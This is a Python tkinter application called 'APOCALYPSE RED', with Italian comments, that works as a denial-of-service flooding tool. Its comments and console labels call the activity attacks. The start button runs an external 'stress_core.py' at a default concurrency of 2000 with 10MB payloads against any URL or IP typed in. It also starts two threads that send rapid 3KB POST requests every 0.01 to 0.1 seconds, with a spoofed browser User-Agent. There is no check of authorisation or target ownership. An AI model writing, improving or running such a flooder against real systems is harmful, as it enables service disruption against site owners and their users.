import tkinter as tk
from tkinter import messagebox, scrolledtext
from PIL import Image, ImageTk
import subprocess
import threading
import sys
import random
import time
import requests
from urllib.parse import urlparse

# Variabili globali
processes = []
fake_threads = []
attack_active = False

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def send_3kb_request(target):
    """Invia una richiesta POST con payload di 3KB al target"""
    try:
        # Crea un payload di 3KB (3072 bytes)
        payload = b'A' * 3072
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/octet-stream',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive'
        }
        
        start_time = time.time()
        response = requests.post(target, data=payload, headers=headers, timeout=3)
        elapsed = (time.time() - start_time) * 1000  # in millisecondi
        
        return response.status_code, elapsed, len(payload)
    except Exception as e:
        return f"Errore: {str(e)}", 0, 0

def fast_3kb_attack(target, box):
    """Esegue attacchi continui con richieste da 3KB"""
    global attack_active
    
    # Aggiungi schema se mancante
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    while attack_active:
        try:
            status, elapsed, size = send_3kb_request(target)
            
            if status == 200:
                box.insert(tk.END, f"[SUCCESS] {target} - 3KB in {elapsed:.1f}ms\n")
            elif isinstance(status, int):
                box.insert(tk.END, f"[STATUS {status}] {target} - 3KB in {elapsed:.1f}ms\n")
            else:
                box.insert(tk.END, f"[ERROR] {status}\n")
                
            box.see(tk.END)
            
            # Frequenza ultra-veloce (0.01-0.1 secondi tra le richieste)
            time.sleep(random.uniform(0.01, 0.1))
            
        except Exception as e:
            box.insert(tk.END, f"[FATAL] {str(e)}\n")
            box.see(tk.END)
            time.sleep(1)

def start_test():
    global attack_active
    target = entry_target.get()
    duration = entry_duration.get()
    concurrency = entry_concurrency.get()
    payload = entry_payload.get()

    if not target:
        messagebox.showerror("Errore", "Inserisci un URL o IP valido.")
        return
    
    if not is_valid_url(target) and not target.replace('.', '').isdigit():
        messagebox.showerror("Errore", "Inserisci un URL valido (es: http://example.com).")
        return

    # Attiva gli attacchi
    attack_active = True
    
    # Avvia il test principale
    cmd = [
        sys.executable, "stress_core.py",
        target,
        "-d", duration,
        "-c", concurrency,
        "--payload-size", payload,
        "--log-level", "INFO"
    ]

    def run():
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            processes.append(process)

            # Avvia attacchi reali da 3KB
            t2 = threading.Thread(target=lambda: fast_3kb_attack(target, output_box_fake2), daemon=True)
            t3 = threading.Thread(target=lambda: fast_3kb_attack(target, output_box_fake3), daemon=True)
            t2.start()
            t3.start()
            fake_threads.extend([t2, t3])

            # Output reale
            for line in iter(process.stdout.readline, ''):
                output_box_main.insert(tk.END, line)
                output_box_main.see(tk.END)
            process.stdout.close()
        except Exception as e:
            output_box_main.insert(tk.END, f"Errore: {e}\n")
            output_box_main.see(tk.END)

    threading.Thread(target=run, daemon=True).start()

def stop_test():
    global attack_active
    attack_active = False
    
    for p in processes:
        if p.poll() is None:
            p.terminate()
    
    output_box_main.insert(tk.END, "Test interrotto manualmente.\n")
    output_box_main.see(tk.END)
    
    # Pulisci le console fake
    output_box_fake2.delete(1.0, tk.END)
    output_box_fake2.insert(tk.END, "DOS Console #2\nAttacco terminato\n")
    output_box_fake3.delete(1.0, tk.END)
    output_box_fake3.insert(tk.END, "DOS Console #3\nAttacco terminato\n")

# GUI setup
root = tk.Tk()
root.title("APOCALYPSE RED")
root.geometry("850x900")
root.configure(bg="#0d0d0d")

font_label = ("OCR A Extended", 11, "bold")
font_input = ("Consolas", 11)
font_title = ("OCR A Extended", 25, "bold")

tk.Label(root, text="A P O C A L Y P S E", font=font_title, fg="red", bg="#0d0d0d").pack(pady=10)

# Immagine centrale
img = Image.open("skull.jpg").resize((300, 150))
photo = ImageTk.PhotoImage(img)
tk.Label(root, image=photo, bg="#0d0d0d").pack(pady=10)

# Input frame
frame_options = tk.Frame(root, bg="#0d0d0d", highlightbackground="red", highlightthickness=2, padx=10, pady=10)
frame_options.pack(pady=10, fill="x", padx=20)

def add_entry(label_text, default=""):
    tk.Label(frame_options, text=label_text, font=font_label, fg="white", bg="#0d0d0d").pack(anchor="w")
    e = tk.Entry(frame_options, font=font_input, fg="red", bg="black", insertbackground="red", width=50)
    if default:
        e.insert(0, default)
    e.pack(pady=2)
    return e

entry_target = add_entry("Target URL o IP (es: http://example.com):")
entry_duration = add_entry("Durata (s):", "60")
entry_concurrency = add_entry("Concorrenza:", "2000")
entry_payload = add_entry("Payload Size (es: 10KB o 10MB):", "10MB")

# Console frame
frame_dos = tk.Frame(root, bg="#0d0d0d")
frame_dos.pack(pady=10)

def create_fake_dos(title):
    box = scrolledtext.ScrolledText(frame_dos, height=10, width=40, bg="black", fg="green", font=("Consolas", 9),
                                    insertbackground="green", highlightbackground="red", highlightthickness=1)
    box.insert(tk.END, f"{title}\nIn attesa di avvio...\n")
    box.pack(side=tk.LEFT, padx=10)
    return box

output_box_main = create_fake_dos("DOS Console #1")
output_box_fake2 = create_fake_dos("DOS Console #2")
output_box_fake3 = create_fake_dos("DOS Console #3")

# Pulsanti
button_frame = tk.Frame(root, bg="#0d0d0d")
button_frame.pack(pady=20)

def hover(e, color): e.widget.config(bg=color)

btn_start = tk.Button(button_frame, text="START", command=start_test, font=font_label,
                      fg="white", bg="red", width=20, height=2)
btn_start.pack(side=tk.LEFT, padx=20)
btn_start.bind("<Enter>", lambda e: hover(e, "#cc0000"))
btn_start.bind("<Leave>", lambda e: hover(e, "red"))

btn_stop = tk.Button(button_frame, text="STOP", command=stop_test, font=font_label,
                     fg="white", bg="grey", width=20, height=2)
btn_stop.pack(side=tk.LEFT, padx=20)

root.mainloop()